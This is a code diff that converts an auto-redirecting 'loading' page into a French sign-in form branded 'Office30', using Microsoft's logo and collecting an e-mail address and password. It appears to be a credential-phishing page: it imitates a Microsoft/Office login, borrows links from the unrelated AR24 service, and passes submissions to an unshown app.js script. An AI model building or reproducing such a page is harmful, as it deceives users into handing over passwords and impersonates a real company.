@@ -5,6 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Connexion - Office30</title>
     <style>
+      * {
+        box-sizing: border-box;
+      }
+
       html,
       body {
         width: 100%;
@@ -18,111 +22,186 @@
         align-items: center;
         font-family: Segoe UI, sans-serif;
         background: #f5f7fb;
+        color: #1b1b1b;
       }
 
-      .loading-box {
+      .login-box {
         width: min(92vw, 440px);
-        min-height: 320px;
+        min-height: 640px;
         border-radius: 16px;
         background: #fff;
         border: 1px solid #e0e0e0;
         box-shadow: 0 8px 32px rgba(0, 0, 0, 0.14);
-        padding: 24px 28px;
-        box-sizing: border-box;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .login-content {
+        padding: 28px 28px 18px;
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
       }
 
       .logo-wrap {
-        margin-bottom: 18px;
+        margin-bottom: 6px;
       }
 
-      .dot-track {
-        position: relative;
-        height: 18px;
-        margin-bottom: 18px;
-        overflow: hidden;
+      .email-hint {
+        color: #444;
+        font-size: 14px;
       }
 
-      .dot {
-        position: absolute;
-        top: 0;
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #0067b8;
-        animation: slideDot 1.8s linear infinite;
+      h1 {
+        margin: 0;
+        font-size: 28px;
+        line-height: 1.25;
+        font-weight: 600;
       }
 
-      .dot:nth-child(1) {
-        animation-delay: 0s;
-      }
-      .dot:nth-child(2) {
-        animation-delay: 0.2s;
-      }
-      .dot:nth-child(3) {
-        animation-delay: 0.4s;
-      }
-      .dot:nth-child(4) {
-        animation-delay: 0.6s;
-      }
-
-      @keyframes slideDot {
-        0% {
-          left: 108%;
-          opacity: 0;
-        }
-        25% {
-          opacity: 1;
-        }
-        50% {
-          left: 50%;
-          transform: translateX(-50%);
-          opacity: 1;
-        }
-        100% {
-          left: -12%;
-          opacity: 0;
-        }
-      }
-
-      .title {
-        font-size: 30px;
-        line-height: 1.2;
+      label {
+        font-size: 14px;
         font-weight: 600;
         color: #1b1b1b;
-        margin: 0 0 8px;
+        margin-bottom: 6px;
+        display: inline-block;
       }
 
-      .text {
-        margin: 0;
+      input[type='text'],
+      input[type='password'] {
+        width: 100%;
+        height: 40px;
+        border: 1px solid #b3b3b3;
+        border-radius: 3px;
+        padding: 0 12px;
         font-size: 14px;
-        line-height: 20px;
-        color: #555;
+      }
+
+      .input-container {
+        position: relative;
+      }
+
+      #visibilityBtn {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+      }
+
+      .icon {
+        width: 16px;
+        height: 16px;
+      }
+
+      .remember {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-top: 4px;
+      }
+
+      .remember label {
+        margin: 0;
+        font-weight: 400;
+      }
+
+      .actions {
+        margin-top: 10px;
+      }
+
+      .btn-primary {
+        min-width: 110px;
+        height: 34px;
+        border: 1px solid #0067b8;
+        border-radius: 2px;
+        background: #0067b8;
+        color: #fff;
+        cursor: pointer;
+        padding: 0 14px;
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      .btn-primary:hover {
+        background: #005a9e;
+        border-color: #005a9e;
+      }
+
+      .links {
+        margin-top: 8px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .links a {
+        color: rgb(0, 103, 184);
+        font-size: 14px;
+        text-decoration: underline;
+      }
+
+      #form-message {
+        min-height: 18px;
+        color: #a80000;
+        font-size: 13px;
       }
     </style>
   </head>
   <body>
-    <section class="loading-box" aria-live="polite">
-      <div class="logo-wrap">
-        <img
-          src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
-          alt="Microsoft"
-          style="height: 24px; width: 112.55px"
-        />
+    <section class="login-box">
+      <div class="login-content">
+        <div class="logo-wrap">
+          <img
+            src="https://ucis.msdxcdn.microsoft.com/1.0.26075.1/Images/microsoftLogoLightMode.svg"
+            alt="Microsoft"
+            style="height: 24px; width: 112.55px"
+          />
+        </div>
+
+        <div class="email-hint">Office30</div>
+        <h1>Connexion</h1>
+
+        <form id="login">
+          <input
+            type="hidden"
+            name="csrf_token"
+            value="eyJ0aW1lc3RhbXAiOjE3NzIyMjE5NzgsIm5vbmNlIjoiNTZmMjg5YTY5ZDlmNTM3ODg3NDhlNWMyNzI4MjZhNTdkNTIzZTY2YjA2YjQ4NDgzZjg2NWFhMWFjMTVhNjVmYyJ92_BFCRJiSxc5eUBk166nEKpo2nTO6a6nzRPg1mbEkok"
+          />
+
+          <label for="ide_id">Adresse e-mail</label>
+          <input id="ide_id" type="text" name="ide" placeholder="Ex : monadresse@email.fr" required autocomplete="new-password" />
+
+          <label for="password_id" style="margin-top: 12px">Mot de passe</label>
+          <div class="input-container">
+            <input class="password" type="password" id="password_id" name="password" placeholder="" required />
+            <i id="visibilityBtn">
+              <span id="icon"><img alt="" class="icon" src="/static/images/icons/eye.svg" /></span>
+            </i>
+          </div>
+
+          <div class="remember">
+            <input type="checkbox" id="remember-me" name="persistent" value="1" />
+            <label for="remember-me">Se souvenir de moi</label>
+          </div>
+
+          <div class="actions">
+            <input class="btn-primary" type="submit" value="Connexion" title="Connexion" aria-label="Se connecter" />
+          </div>
+        </form>
+
+        <p id="form-message" aria-live="polite"></p>
+
+        <div class="links">
+          <a href="https://app.ar24.fr/fr/page/forgot" aria-label="Cliquez ici pour être redirigé vers la procédure de réinitialisation de votre mot de passe dans le cas où vous l'auriez oublié">Réinitialiser mon mot de passe</a>
+          <a href="https://app.ar24.fr/fr/user/register" aria-label="Cliquez ici pour être redirigé vers la page d'inscription d'AR24">Créer un compte</a>
+        </div>
       </div>
-      <div class="dot-track" aria-hidden="true">
-        <span class="dot"></span>
-        <span class="dot"></span>
-        <span class="dot"></span>
-        <span class="dot"></span>
-      </div>
-      <h1 class="title">Chargement</h1>
-      <p class="text">Connexion à votre espace sécurisé Office30.</p>
     </section>
 
-    <script>
-      setTimeout(() => {
-        window.location.href = 'verification.html';
-      }, 3200);
-    </script>
+    <script src="app.js"></script>
   </body>
 </html>
